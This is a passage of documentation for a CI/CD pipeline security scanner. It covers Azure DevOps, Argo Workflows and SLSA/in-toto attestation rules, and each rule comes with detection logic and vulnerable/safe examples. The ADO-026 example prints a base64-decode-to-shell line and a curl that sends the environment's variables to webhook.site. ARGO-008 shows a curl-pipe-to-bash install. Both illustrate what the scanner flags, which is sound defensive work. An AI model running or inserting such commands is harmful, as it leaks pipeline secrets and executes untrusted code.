**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Proof of exploit.**

```
# Vulnerable: a step body executes a base64-decoded
# payload, exfils to ``webhook.site``, or runs a
# known miner binary. A malicious PR (or compromised
# co-maintainer) lands the payload in the pipeline file
# itself; every subsequent run executes it.
steps:
  - bash: |
      echo Z2g6Li4uIA== | base64 -d | sh
      curl https://webhook.site/abc?env=$(env|base64)

# Safe: the pipeline does only what the pipeline does.
# No obfuscated execution, no exfil POSTs, no
# ``base64 -d | sh`` pipelines. If a check fires here
# it's either a compromise or a CTF fixture; treat as
# incident response.
steps:
  - checkout: self
  - bash: make build
```

**Source:** [`ADO-026`](../providers/azure.md#ado-026) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-028`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-028 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Complements ADO-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry (Azure Artifacts) instead of installing from a filesystem path or tarball URL.

**Source:** [`ADO-028`](../providers/azure.md#ado-028) in the [Azure DevOps provider](../providers/azure.md).

### `ARGO-001`: Argo template container image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-argo-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Walks ``spec.templates[].container``, ``spec.templates[].script``, and ``spec.templates[].containerSet.containers[]``. The image must contain ``@sha256:`` followed by a 64-char hex digest.

**Recommendation.** Pin every container / script template image to a content-addressable digest (``alpine@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the workflow's containers at the next pull, with no audit trail in the WorkflowTemplate.

**Proof of exploit.**

```
# Vulnerable: ``alpine:3.18`` is a mutable tag. The Alpine
# maintainers (or a registry compromise / namespace hijack)
# repoint the tag on the next 3.18.x point release; every
# Workflow run after that pulls the new image without any
# audit trail in the manifest.
apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata: { name: build }
spec:
  templates:
    - name: build
      container:
        image: alpine:3.18
        command: [./build.sh]

# Safe: pin to the content-addressable digest. Renovate's
# docker-tag ecosystem bumps the digest in reviewable PRs
# so the pin doesn't drift behind security patches.
apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata: { name: build }
spec:
  templates:
    - name: build
      container:
        image: alpine@sha256:abc123...
        command: [./build.sh]
```

**Source:** [`ARGO-001`](../providers/argo.md#argo-001) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-008`: Argo script source pipes remote install or disables TLS <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-argo-008 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Walks ``script.source`` and joined ``container.args`` text with the cross-provider ``_primitives.remote_script_exec`` and ``_primitives.tls_bypass`` detectors. Coverage stays aligned with GHA-016 / GHA-027 / BK-004 / BK-008 / TKN-008 / GCB-010 / GCB-011 / DF-004.

**Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the template image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the workflow runs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``curl | bash`` trusts both the network path
# (any MITM substitutes the script) and the host (an
# attacker-compromised installer endpoint silently serves
# attacker code). The script runs as the workflow's pod,
# inheriting every secret mounted into the container.
apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
spec:
  templates:
    - name: install-cli
      script:
        image: alpine@sha256:abc123...
        command: [sh]
        source: |
          curl -fsSL https://installer.example.com/cli.sh | bash

# Safe: download to a file, verify a sha256 digest from a
# trusted source, then execute. If the upstream content
# changes the digest stops matching and the build fails
# before the malicious code runs.
apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
spec:
  templates:
    - name: install-cli
      script:
        image: alpine@sha256:abc123...
        command: [sh]
        source: |
          set -e
          curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
          echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
          bash /tmp/cli.sh
```

**Source:** [`ARGO-008`](../providers/argo.md#argo-008) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-009 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Detection mirrors GHA-006 / TKN-009 / BK-009, the shared signing-token catalog (cosign, sigstore, slsa-github-generator, slsa-framework, notation-sign) is searched across every string in each Argo document. Fires only on artifact-producing Workflows / WorkflowTemplates (those that invoke ``docker build`` / ``docker push`` / kaniko / ``helm upgrade`` / ``aws s3 sync`` / etc.) so lint-only Workflows don't trip it.

**Recommendation.** Add a cosign step to the Workflow. The most common shape is a final ``sign`` template that runs ``cosign sign --yes <repo>@sha256:<digest>`` after the build. Sign by digest, not tag, so a re-pushed tag can't bypass the signature.

**Source:** [`ARGO-009`](../providers/argo.md#argo-009) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-010 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog: syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool. Fires only on artifact-producing Workflows.

**Recommendation.** Add an SBOM-generation template. ``syft <artifact> -o cyclonedx-json > /tmp/sbom.json`` runs in any standard container; ``cyclonedx-cli`` and ``cdxgen`` are alternative producers. Persist the SBOM as an output artifact so downstream templates and consumers can read it.

**Source:** [`ARGO-010`](../providers/argo.md#argo-010) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-011 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``witness run``, ``attest-build-provenance``).

**Recommendation.** Add a ``cosign attest --predicate slsa.json --type slsaprovenance <ref>`` step after the build template, or use ``witness run`` to record the build environment. Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`ARGO-011`](../providers/argo.md#argo-011) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-012 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers *does this artifact ship a known CVE?* rather than *can we verify what it is?*. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, osv-scanner, govulncheck, anchore, codeql-action, semgrep, bandit, checkov, tfsec. Walks every Argo document and passes if any document includes a scanner reference.

**Recommendation.** Add a vulnerability scanner template. ``trivy fs /workdir`` for source / filesystem; ``trivy image <ref>`` for container images. ``grype``, ``snyk``, ``npm audit``, ``pip-audit`` are alternatives. Fail the template on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`ARGO-012`](../providers/argo.md#argo-012) in the [Argo Workflows provider](../providers/argo.md).

### `ATTEST-001`: SLSA provenance attests an untrusted builder identity <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-001 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** Reads the SLSA provenance from each in-toto Statement carried in the image's attestation manifests, then checks ``predicate.builder.id`` (SLSA v0.2) / ``predicate.runDetails.builder.id`` (SLSA v1) against an allowlist of URI prefixes for hosted CI builders. Fires when the attested builder is unknown or matches a self-hosted-runner shape.

Triggering this rule means the bytes of the runtime image were produced by a builder identity the SLSA contract cannot vouch for. A compromised self-hosted runner can produce a perfectly-formed, signature-valid attestation for a tampered image, so a passing OCI-002 (attestation present) is not the same thing as a trustworthy attestation, this rule is the difference.

**Recommendation.** Re-run the build on a recognized hosted CI builder (GitHub-hosted runners, slsa-github-generator, Cloud Build, GitLab SaaS, Buildkite, or BuildKit attesting via Docker Hub) so the SLSA ``builder.id`` claim resolves to an isolated, publicly-auditable build environment. Self-hosted runners and unknown builder identities defeat the SLSA L2+ isolation guarantee, the supply-chain trust chain only extends as far as the *builder* the attestation names.

**Known false positives.**

- Some teams run their own SLSA-conformant builders for policy reasons (air-gapped builds, regulated workloads, FedRAMP environments). Add the builder's URI prefix to a future allowlist override (deferred to v2) or suppress via ignore-file when the team has a documented review of the builder's isolation posture.
- Older BuildKit versions emitted a generic placeholder (``https://github.com/docker/buildx@v0.X``) without tying the identity to the runner. Modern Buildx writes a concrete builder URI; if the scan flags a placeholder, upgrade Buildx and rebuild before treating it as a real incident.

**Seen in the wild.**

- [SLSA threat-model v1.0](https://slsa.dev/spec/v1.0/threats): untrusted builder is the canonical Build-track Threat #2 ('Build the package from a modified source'). A tampered self-hosted runner can emit a syntactically-valid attestation for the wrong source.
- [GitHub docs on self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security): non-ephemeral self-hosted runners default to persisted state between jobs; one compromised job gives the attacker arbitrary code execution that produces signed artifacts on every subsequent legitimate build on that runner. SLSA's isolation requirement (L2+) explicitly excludes this shape, which is why the rule treats ``self-hosted`` URIs as untrusted regardless of the rest of the chain.

**Proof of exploit.**

```
# Vulnerable: the SLSA provenance attestation names a
# self-hosted builder whose isolation cannot be audited
# publicly. The signed attestation only attests that *this*
# builder produced the artifact; it doesn't guarantee the
# build environment was hermetic. A compromised self-hosted
# runner produces signed provenance for malicious bytes.
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "predicate": {
    "builder": {
      "id": "https://internal-jenkins.example.com/jobs/build"
    },
    "buildType": "https://example.com/build-script@v1"
  }
}

# Safe: rebuild via a recognized hosted CI builder that
# enforces hermetic isolation (slsa-github-generator on a
# GitHub-hosted runner, the canonical SLSA L3 producer).
# Downstream verifiers can validate the builder URI against
# a public allowlist and trust the isolation guarantee.
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "predicate": {
    "builder": {
      "id": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v2.1.0"
    },
    "buildType": "https://github.com/slsa-framework/slsa-github-generator/container@v1"
  }
}
```

**Source:** [`ATTEST-001`](../providers/oci.md#attest-001) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-002`: SLSA provenance source-repo claim is missing or unverifiable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-002 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** The ``builder.id`` claim that ATTEST-001 verifies tells you *who* built the image. The source-repo claim ATTEST-002 verifies tells you *what* they built. Both are required for the SLSA chain to be meaningful: a trusted builder running an unknown source produces a signed attestation for code you can't audit.

The rule walks the SLSA provenance predicate for a source URI. Path varies by spec version:
  - v0.2: ``predicate.invocation.configSource.uri``
  - v1.0: ``predicate.buildDefinition.externalParameters`` (builder-specific, commonly ``.workflow.repository`` or ``.source.uri``)
Fires when:
  - no URI is present anywhere on the expected paths;
  - the URI is a known placeholder (empty, ``?``, ``unknown``, ``n/a``);
  - the URI doesn't parse as a recognizable VCS / HTTPS shape;
  - a URI is present but the corresponding digest field is missing or all-zeros (the bytes aren't actually pinned).

**Recommendation.** Ensure the build emits SLSA provenance with a concrete source-repo URI plus a commit-level digest. For SLSA v0.2 that's ``predicate.invocation.configSource.uri`` + ``configSource.digest`` (typically ``sha1`` for git refs). For SLSA v1, ``predicate.buildDefinition.externalParameters`` should name the workflow's source repository, and ``predicate.buildDefinition.resolvedDependencies`` should include the same source pinned by digest. A missing or placeholder URI ('', 'unknown', 'n/a') leaves consumers unable to confirm what code produced the image.

**Known false positives.**

- Some SLSA Phase-0 attestations omit the digest field on purpose, the build was reproducible-by-source rather than pinned to a commit. Suppress via ignore-file when the team has documented this trade-off; the default expectation for any image promoted to a production registry is a concrete commit pin.
- Builders that emit free-form ``externalParameters`` shapes (some self-hosted SLSA implementations) may carry the source URI under a non-canonical key. The rule walks every string value in ``externalParameters`` looking for a VCS URI; if none is found, the finding fires. Add the builder to a future allowlist override (deferred) when the shape is intentional.

**Seen in the wild.**

- [SLSA v1.0 threat model](https://slsa.dev/spec/v1.0/threats) (Source-track threats): a builder pulling code from a fork or a different ref than the operator believes produces an attestation that signs the wrong bytes. The source-track threats catalog those source-substitution shapes that a pinned + verified source claim mitigates.
- [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): the build system pulled tampered source from an unauthorized branch via SUNSPOT, producing 'authentic' signed builds for code the development team never wrote. A pinned, verified source-repo claim is the control SLSA L2+ requires specifically to detect this shape.

**Proof of exploit.**

```
# Vulnerable: ``configSource.uri`` is empty (or 'unknown' /
# 'n/a' / a placeholder). The trusted builder produced and
# signed an attestation but the source-repo claim is
# missing, so a downstream verifier can confirm WHO built
# but not WHAT they built. The attestation is structurally
# valid yet semantically empty.
{
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "predicate": {
    "builder": { "id": "https://github.com/.../generator@v2.1.0" },
    "invocation": {
      "configSource": {
        "uri": "",
        "digest": {}
      }
    }
  }
}

# Safe: concrete source-repo URI plus a commit-level
# digest. Verifiers can now confirm the image was built
# from the expected repository at the expected commit.
{
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "predicate": {
    "builder": { "id": "https://github.com/.../generator@v2.1.0" },
    "invocation": {
      "configSource": {
        "uri": "git+https://github.com/myorg/myrepo@refs/tags/v1.4.2",
        "digest": { "sha1": "0123456789abcdef0123456789abcdef01234567" }
      }
    }
  }
}
```

**Source:** [`ATTEST-002`](../providers/oci.md#attest-002) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-003`: SBOM contains floating-version dependencies <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-003 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** ATTEST-001 verifies the builder; ATTEST-002 verifies the source; ATTEST-003 verifies the *contents* of what was shipped. A signed SBOM that declares ``openssl`` version ``latest`` is worse than no SBOM, the signature gives the rot a stamp of approval. Vulnerability-scanning tooling that reads the SBOM produces false negatives because the version it queries CVE databases for is unstable.

Detection walks every SBOM attestation (predicate types starting with ``https://spdx.dev/Document`` or ``https://cyclonedx.org/bom``) and checks each declared package's version field against a floating-shape regex. A package is considered pinned when its version matches a concrete release identifier (semver, calver, sha-style digest, or any git tag with at least one numeric component).

**Recommendation.** Pin every dependency in the SBOM to a concrete version (a released semver, a digest, or a tag-plus-commit pair). Floating values like ``latest``, ``*``, ``master``, an empty string, or a bare major like ``v1`` defeat the SBOM's purpose: a consumer can't reproduce or vulnerability-scan what they don't have a fixed version of. SPDX 2.x carries version under ``packages[*].versionInfo``; CycloneDX uses ``components[*].version``. Both fields are optional in the spec but operationally required for any meaningful SBOM consumption.

**Known false positives.**

- Some SBOM emitters legitimately leave ``versionInfo`` empty for system-injected components the build couldn't resolve (e.g. ``glibc`` from the base image when the image was built without distro metadata). Suppress via ignore-file scoped to the manifest path when the SBOM was produced in a context that intentionally elides those entries; for production-bound images the expectation is full version coverage.
- Source-only components (a Git repo bundled into a builder stage) sometimes carry the branch name in version. Long-term that's still a floating reference (the branch tip moves), so the rule fires by design; switch to tag+digest pinning before suppressing.

**Seen in the wild.**

- [Log4Shell downstream impact](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a) (CVE-2021-44228): organizations with SBOMs at the ready could ship patches in hours; those without (or with floating-version SBOMs) spent days auditing builds to discover what they actually shipped. The ``log4j-core@latest`` shape was the worst case — the SBOM said the right name but no consumer could pin which exact bytes were in production.
- Common SBOM-quality findings (NTIA SBOM Minimum Elements report, 2021): version completeness consistently the lowest-scoring dimension across producers. Floating versions account for the bulk of unconsumed SBOMs in vulnerability-management pipelines.

**Source:** [`ATTEST-003`](../providers/oci.md#attest-003) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-004`: SLSA provenance ships without a resolved-dependencies set <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-004 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Walks every SLSA provenance attestation on the image index and reads the materials list at the spec-version-appropriate path. Both v0.2 and v1 are accepted. A missing key, a non-list value, and an empty list all fail (each shape means the consumer gets no input chain-of-custody). Per-material content validation (digest map populated, URI well-formed) is deferred to a future rule, this one establishes that the list exists.

Pairs with ATTEST-003: ATTEST-003 verifies the SBOM covers package-level inputs, ATTEST-004 verifies the build-level inputs. Both are needed for the SLSA Build-track L3 'isolated, reproducible' claim; SBOM-only coverage misses the resolved base image and the build-tool chain.

**Recommendation.** Configure the builder to emit a non-empty ``materials`` (SLSA v0.2) or ``resolvedDependencies`` (SLSA v1) list with one entry per ingredient the build consumed. For BuildKit, set ``--attest=type=provenance,mode=max`` so the resolved-base-image + checked-out source land in the attestation. For slsa-github-generator the L3 presets populate this automatically; teams running a custom generator must add the inputs explicitly. An empty list is structurally indistinguishable from 'the build had no inputs' and breaks downstream vulnerability correlation.

**Known false positives.**

- Trivial ``FROM scratch`` images with no build-time dependencies legitimately have an empty materials list. The rule has no way to distinguish 'trivial build' from 'instrumentation gap', the SLSA spec treats both as the same fail-closed signal. Suppress per-image via ``--ignore-file`` once you've verified the build genuinely has nothing to attest.
- Some builders (older BuildKit, hand-rolled generators) populate ``materials`` but omit the ``digest`` map, which the SLSA spec marks recommended-not-required. This rule accepts that shape today (list non-empty = pass); a future ATTEST-NNN will tighten to require digest coverage.

**Seen in the wild.**

- [SLSA v1 spec, Build track L3 requirements](https://slsa.dev/spec/v1.0/levels#build-l3): resolved dependencies are a Build-track requirement, not an optional courtesy. The provenance was supposed to answer 'what went into this artifact'; an empty resolvedDependencies list answers 'we declined to say', which is materially worse than 'we didn't produce an attestation' because consumers see a signed-and-stamped document and trust it.
- tj-actions/changed-files compromise (CVE-2025-30066, March 2025): forensic teams reconstructing the blast radius needed to know which downstream images consumed the compromised action's outputs. Builds whose provenance carried materials lists pinpointed the exposure in minutes; builds without paid for the gap in days of manual review.

**Proof of exploit.**

```
# Vulnerable: a hand-rolled or older-Buildx provenance
# emitter ships a Statement whose materials list is empty.
# (Modern BuildKit ``--attest=type=provenance`` populates a
# materials list by default; ``mode=max`` enriches it with
# decoded build args / fuller layer metadata, but the
# rule fires structurally on missing/empty regardless of
# which emitter produced the output.)

# Resulting provenance (SLSA v0.2 predicate):
#   {
#     "builder": {"id": "https://my-internal-ci/runner@v3"},
#     "buildType": "https://example.com/buildtype/v1",
#     "invocation": { ... configSource present ... },
#     "materials": []          <-- empty
#   }

# Attack surface: a downstream CVE advisory for the
# resolved base image (say, ubuntu:22.04 -> a specific
# digest known to ship the vulnerable libcurl) can't be
# correlated to this image because the provenance never
# recorded which base image was resolved at build time.
# Forensic response shifts from "grep provenance for
# affected digest" to "rebuild every image and inspect
# layer contents."

# Safe: use a builder that emits resolved materials. For
# BuildKit that's any recent Buildx with
# ``--attest=type=provenance`` (default mode already
# populates the list; pass ``mode=max`` if you also want
# decoded build args + fuller layer metadata).
$ docker buildx build \
    --attest=type=provenance,mode=max \
    --tag registry.example/app:v1.4.2 \
    --push .

# Resulting provenance:
#   "materials": [
#     {"uri": "pkg:docker/ubuntu@22.04",
#      "digest": {"sha256": "<resolved digest>"}},
#     {"uri": "git+https://github.com/foo/bar@v1.4.2",
#      "digest": {"sha1": "<commit sha>"}}
#   ]
```

**Source:** [`ATTEST-004`](../providers/oci.md#attest-004) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-005`: In-toto Statement subject is missing or unpinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-005 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** Walks every parsed in-toto Statement (SLSA provenance + SBOM both) and validates the subject array. Three failure shapes:
  - ``subject`` is missing or an empty list, the Statement attests nothing.
  - A subject entry has no ``digest`` map, the entry names an artifact but doesn't bind to its bytes.
  - A digest value is empty, all-zeros, or not valid hex, the bind exists structurally but the value is a placeholder.

Hex validation is conservative: the value must consist entirely of ``0-9`` and ``a-f`` (case-insensitive) and the length must be a multiple of two (a valid byte encoding). Algorithm-specific length checks (``sha256`` = 64 chars, ``sha1`` = 40) are not enforced here, some registries truncate to a 16-char prefix and the rule accepts those as long as the bytes are well-formed.

**Recommendation.** Configure the builder to emit Statements with a non-empty ``subject`` array whose entries each carry a populated ``digest`` map. The digest value must be a real hex encoding of the artifact's bytes, an empty string or all-zeros placeholder defeats verification. For BuildKit this is automatic when ``--attest=type=provenance`` is set alongside ``--push``; older Buildx versions sometimes emitted Statements with empty subjects, upgrade if you see this fire on a recent build. For slsa-github-generator and cosign-attested workflows the subject is populated by the framework, an empty subject usually means a custom attestor was wired up incorrectly.

**Known false positives.**

- Some experimental attestor implementations emit Statements with placeholder subjects for in-flight verification (the bytes are still being uploaded when the attestation is signed). Suppress per-manifest via ``--ignore-file`` if the team has a documented review of the deferred-binding pattern; the default expectation for any image promoted to a production registry is a subject digest that matches the actual image bytes.
- Multi-subject Statements (one attestation covering multiple sibling artifacts) are accepted, as long as *every* entry has a populated digest. A partially-filled subject array fires because the unbound entries are the substitution surface, the rest don't compensate.

**Seen in the wild.**

- [in-toto Statement spec](https://github.com/in-toto/attestation/blob/main/spec/v1/statement.md): the subject digest is the cryptographic bind between a signed envelope and the artifact bytes. A placeholder value reduces the attestation to a free-floating signature attackers can re-attach.
- [SLSA v1.0 verifying artifacts](https://slsa.dev/spec/v1.0/verifying-artifacts): consumers MUST compare the attestation's subject digest against the artifact they're about to use. A signed envelope whose subject is unbound to artifact bytes passes signature verification but fails this comparison step trivially — which is exactly what an attacker exploits when re-attaching a valid signature to a tampered image.

**Proof of exploit.**

```
# Vulnerable: a Statement signed by a trusted builder but
# carrying an empty subject digest. The signature is valid;
# the bind to the image bytes is not.
{
  "_type": "https://in-toto.io/Statement/v1",
  "subject": [
    {"name": "image", "digest": {"sha256": ""}}
  ],
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": { ... }
}

# Attack: an attacker who can re-publish the signed DSSE
# envelope (the envelope is public on the OCI registry the
# image is pushed to) attaches it to a tampered image. The
# consumer's verifier checks the signature (valid, the
# builder did sign this Statement), checks the source repo
# (valid, ATTEST-002 passes), checks the builder identity
# (valid, ATTEST-001 passes), and never gets to compare
# the subject digest because the digest is empty. Result:
# the tampered image looks fully attested.

# Safe: subject digest populated with the actual image
# config digest BuildKit / slsa-github-generator emit by
# default when wired up correctly.
{
  "_type": "https://in-toto.io/Statement/v1",
  "subject": [
    {"name": "image",
     "digest": {
       "sha256": "4d5a6e7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f70819"
                    "a2b3c4d5e6f70819a2b3c4d5e6f70819"
     }}
  ],
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": { ... }
}
```

**Source:** [`ATTEST-005`](../providers/oci.md#attest-005) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-006`: SLSA provenance lacks a meaningful buildType <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-006 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** Reads the ``buildType`` claim at the spec-appropriate path: v0.2 at ``predicate.buildType``, v1 at ``predicate.buildDefinition.buildType``. Fires when the claim is missing, an empty string, or a known placeholder (``example.com``, ``unknown``, ``n/a``, ``tbd``). A well-shaped buildType is a URI with a scheme and a path component; the rule does a conservative URI-shape check to catch typos like a bare repository name or an unfilled template token.

Doesn't validate that the URI is reachable or that the schema it names is one a verifier knows about; that's policy-layer work (an allowlist of trusted buildType URIs is a separate consumer-side concern).

**Recommendation.** Configure the builder to emit a concrete ``buildType`` URI naming the schema the provenance follows. For slsa-github-generator that's automatic (``https://github.com/slsa-framework/slsa-github-generator/<workflow>@<ref>``). For BuildKit the canonical URI is ``https://github.com/Attestations/GitHubHostedActions@v1`` or one of the SLSA-listed build types at https://slsa.dev/buildtypes/. Custom in-house generators should publish their own buildType URI that points at a stable schema doc; the URI doesn't need to be globally registered, but it does need to be resolvable so consumers can review the schema.

**Known false positives.**

- Some experimental generators emit a buildType under a placeholder URI during development (``https://example.com/buildtype/v1``). The rule fires on those by design; the canonical fix is to publish a real schema URI before any image ships to a registry that downstream consumers trust. Suppress per-manifest via ``--ignore-file`` only when the team has a documented review of the placeholder's intended scope.
- BuildKit < v0.10 emitted Statements without a buildType field at all. Modern Buildx always populates it; if the rule fires on a current build, the provenance configuration is likely incomplete rather than the Buildx version being too old.

**Seen in the wild.**

- [SLSA v1.0 provenance spec](https://slsa.dev/spec/v1.0/provenance): buildType is REQUIRED on every Statement. The spec calls out that consumers MUST refuse provenance whose buildType they don't recognize, which means an under-specified buildType reduces the attestation to advisory text the verifier can't act on.
- [SLSA build types catalog](https://slsa.dev/buildtypes/): the publicly registered buildType URIs SLSA-aware tooling knows how to verify. Provenance that names an unregistered URI is acceptable when paired with a documented schema, but provenance with no URI at all is structurally unverifiable.

**Proof of exploit.**

```
# Vulnerable: a self-rolled SLSA generator that omits the
# buildType field. The predicate carries every other
# claim (builder, materials, configSource) but consumers
# can't tell which schema those claims follow.
{
  "_type": "https://in-toto.io/Statement/v1",
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": {
    "buildDefinition": {
      "externalParameters": {...},
      "resolvedDependencies": [...]
      // no buildType key
    },
    "runDetails": {"builder": {"id": "..."}}
  }
}

# Attack surface: a consumer verifying this Statement with
# a policy of 'only accept buildType = <list>' has no field
# to match against. Two common downstream outcomes:
#   1. The verifier rejects every Statement (over-strict);
#   2. The verifier accepts every Statement (over-loose),
#      which means an attacker forging materials in a
#      different schema slips by because the verifier
#      can't tell the schemas apart.

# Safe: emit a concrete buildType URI. For slsa-github-
# generator the framework fills this in automatically:
{
  "predicate": {
    "buildDefinition": {
      "buildType": "https://github.com/slsa-framework/"
                    "slsa-github-generator/generic@v2",
      ...
    }
  }
}
```

**Source:** [`ATTEST-006`](../providers/oci.md#attest-006) in the [OCI manifest provider](../providers/oci.md).

### `ATTEST-007`: SBOM packages lack supplier / originator attribution <span class="pg-sev pg-sev--low">LOW</span> { #detail-attest-007 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Walks every SBOM attestation (SPDX + CycloneDX) and counts components / packages without supplier attribution. SPDX checks ``packages[*].supplier``; CycloneDX checks ``components[*].supplier.name`` (the spec uses an object with a ``name`` key, unlike SPDX's bare string). A package passes when the field exists, is non-empty, and isn't the ``NOASSERTION`` sentinel.

Severity LOW because the failure mode is downstream correlation friction rather than direct execution risk. Pair with ATTEST-003 (version completeness) for the full SBOM-quality story; an SBOM that has versions but no suppliers, or suppliers but no versions, is only half actionable.

**Recommendation.** Configure the SBOM emitter to populate supplier and (where applicable) originator fields for every component. Syft / Trivy / cdxgen all support supplier inference from package-manager metadata; the field is most often missing because the generator was invoked without the relevant ecosystem authority configured. For hand-rolled SBOM pipelines, derive ``supplier`` from the package registry (``pkg:npm/foo`` -> ``Organization: https://npmjs.com``) or the upstream maintainer's published metadata. ``NOASSERTION`` is acceptable only when the package truly has no identifiable supplier; treating it as a routine default defeats downstream attribution.

**Known false positives.**

- Air-gapped builds where the SBOM emitter genuinely cannot resolve a supplier (private registry without ecosystem metadata) legitimately ship ``NOASSERTION`` for affected packages. Suppress per-manifest via ``--ignore-file`` when the gap is documented; the default expectation for any image promoted to a production registry is supplier attribution on every third-party component.
- System-injected components (``glibc`` from a distroless base image, kernel symbols) sometimes carry no supplier because the SBOM emitter didn't have distro metadata available. The rule fires by design; the canonical fix is to provide a supplier of last resort (e.g. the base image vendor) rather than to suppress.

**Seen in the wild.**

- [NTIA SBOM Minimum Elements report](https://www.ntia.gov/files/ntia/publications/sbom_minimum_elements_report.pdf) (2021): supplier name is listed as a minimum required element. NTIA's quality assessment of real-world SBOMs consistently flagged supplier coverage as one of the lowest-scoring dimensions across producers.
